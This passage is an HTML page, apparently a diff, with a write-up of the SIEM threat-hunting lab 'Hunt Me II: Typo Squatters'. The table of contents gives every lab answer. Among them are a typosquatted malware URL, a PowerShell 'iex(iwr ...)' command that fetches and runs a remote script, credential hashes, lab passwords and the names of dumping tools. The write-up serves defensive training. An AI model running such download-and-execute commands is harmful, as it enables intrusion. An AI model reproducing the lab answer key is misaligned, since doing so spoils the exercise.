+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_023433-5e02d0f7.png" data-alt="Screenshot 2025-04-24 023433.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_023433-5e02d0f7.png" alt="Screenshot 2025-04-24 023433.png" loading="lazy"></button></p>
+<p><strong>We know that Mr Hall is the domain admin user.</strong></p>
+<p>Invoke-SharpKatz&quot; AND message:&quot;hall</p>
+<p>or we can search with AES265</p>
+<h4 id="15-after-gaining-domain-admin-access-the-attacker-popped-ransomware-on-workstations.-how-m">15- After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?</h4>
+<h4 id="46">46</h4>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-05-12_082811-148fb9aa.png" data-alt="Screenshot 2025-05-12 082811.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-05-12_082811-148fb9aa.png" alt="Screenshot 2025-05-12 082811.png" loading="lazy"></button></p>
+<p>way back to question 2 we come across bomb.exe which the attacker download from his domain from its name we are pretty sure its the ransomware</p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-05-12_083146-5c9fd91b.png" data-alt="Screenshot 2025-05-12 083146.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-05-12_083146-5c9fd91b.png" alt="Screenshot 2025-05-12 083146.png" loading="lazy"></button></p>
+<p><button class="image-button" data-src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_024127-bdd2a956.png" data-alt="Screenshot 2025-04-24 024127.png"><img src="../assets/images/threat-hunting-labs-siemhunt-me-ii-typo-squatters-thm-screenshot_2025-04-24_024127-bdd2a956.png" alt="Screenshot 2025-04-24 024127.png" loading="lazy"></button></p>
+<p>process.name : bomb.exe AND winlog.event_id:11</p></section>
+      </article>
+      <details class="toc" open><summary>Table of contents</summary><a href="#hunt-me-ii-typo-squatters">Hunt Me II: Typo Squatters</a><a href="#scenario">Scenario</a><a href="#1-what-is-the-url-of-the-malicious-software-that-was-downloaded-by-the-victim-user">1- What is the URL of the malicious software that was downloaded by the victim user?</a><a href="#httpwww.7zipp.orga7z2301-x64.msi">http://www.7zipp.org/a/7z2301-x64.msi</a><a href="#2-what-is-the-ip-address-of-the-domain-hosting-the-malware">2- What is the IP address of the domain hosting the malware?</a><a href="#206.189.34.218">206.189.34.218</a><a href="#3-what-is-the-pid-of-the-process-that-executed-the-malicious-software">3- What is the PID of the process that executed the malicious software?</a><a href="#2532">2532</a><a href="#4-following-the-execution-chain-of-the-malicious-payload-another-remote-file-was-downloade">4- Following the execution chain of the malicious payload, another remote file was downloaded and executed. What is the full command line value of this suspicious activity?</a><a href="#powershell.exe-iexiwr-httpwww.7zipp.orga7z.ps1-useb">powershell.exe iex(iwr http://www.7zipp.org/a/7z.ps1 -useb)</a><a href="#5-the-newly-downloaded-script-also-installed-the-legitimate-version-of-the-application.-wh">5- The newly downloaded script also installed the legitimate version of the application. What is the full file path of the legitimate installer?</a><a href="#cwindowstemp7zlegit.exe">C:\Windows\Temp\7zlegit.exe</a><a href="#6-what-is-the-name-of-the-service-that-was-installed">6- What is the name of the service that was installed?</a><a href="#7zservice">7zService</a><a href="#7-the-attacker-was-able-to-establish-a-c2-connection-after-starting-the-implanted-service.">7- The attacker was able to establish a C2 connection after starting the implanted service. What is the username of the account that executed the service?</a><a href="#system">SYSTEM</a><a href="#8-after-dumping-lsass-data-the-attacker-attempted-to-parse-the-data-to-harvest-the-credent">8- After dumping LSASS data, the attacker attempted to parse the data to harvest the credentials. What is the name of the tool used by the attacker in this activity?</a><a href="#invoke-powerextract">Invoke-PowerExtract</a><a href="#9-what-is-the-credential-pair-that-the-attacker-leveraged-after-the-credential-dumping-act">9- What is the credential pair that the attacker leveraged after the credential dumping activity? (format: username:hash)</a><a href="#james.cromwellb852a0b8bd4e00564128e0a5ea2bc4cf">james.cromwell:B852A0B8BD4E00564128E0A5EA2BC4CF</a><a href="#10-after-gaining-access-to-the-new-account-the-attacker-attempted-to-reset-the-credentials">10- After gaining access to the new account, the attacker attempted to reset the credentials of another user. What is the new password set to this target account?</a><a href="#pwn3dpw">pwn3dpw!!!</a><a href="#11-what-is-the-name-of-the-workstation-where-the-new-account-was-used">11- What is the name of the workstation where the new account was used?</a><a href="#wkstn-02">WKSTN-02</a><a href="#12-after-gaining-access-to-the-new-workstation-a-new-set-of-credentials-was-discovered.-wh">12- After gaining access to the new workstation, a new set of credentials was discovered. What is the username, including its domain, and password of this new account?</a><a href="#ssfitadminnoo639sk0">SSF\itadmin:NoO6@39Sk0!</a><a href="#13-aside-from-mimikatz-what-is-the-name-of-the-powershell-script-used-to-dump-the-hash-of-">13- Aside from mimikatz, what is the name of the PowerShell script used to dump the hash of the domain admin?</a><a href="#invoke-sharpkatz.ps1">Invoke-SharpKatz.ps1</a><a href="#14-what-is-the-aes256-hash-of-the-domain-admin-based-on-the-credential-dumping-output">14- What is the AES256 hash of the domain admin based on the credential dumping output?</a><a href="#f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534">f28a16b8d3f5163cb7a7f7ed2c8f2cf0419f0b0c2e28c15f831d050f5edaa534</a><a href="#15-after-gaining-domain-admin-access-the-attacker-popped-ransomware-on-workstations.-how-m">15- After gaining domain admin access, the attacker popped ransomware on workstations. How many files were encrypted on all workstations?</a><a href="#46">46</a></details>
+    </div>
+    
+    <footer class="pager"><a href="hunt-me-i-payment-collectors.html">← Hunt Me I Payment Collectors</a><a href="summary-report-9541433d.html">Summary Report →</a></footer></main>
+  </div>
+  <div class="lightbox" id="lightbox" hidden><button type="button" aria-label="Close image">×</button><img alt=""></div>
+  <div class="command-palette" id="commandPalette" hidden>
+    <div class="command-panel">
+      <div class="command-head"><strong>Quick jump</strong><button type="button" id="closeCommand">Close</button></div>
+      <input id="commandInput" type="search" placeholder="Search any note, tag, command, or MITRE ID">
+      <div id="commandResults" class="command-results"></div>
+    </div>
+  </div>
+  <script src="../data/json/search-index.js"></script>
+  <script src="../script.js"></script>
+</body>
+</html>
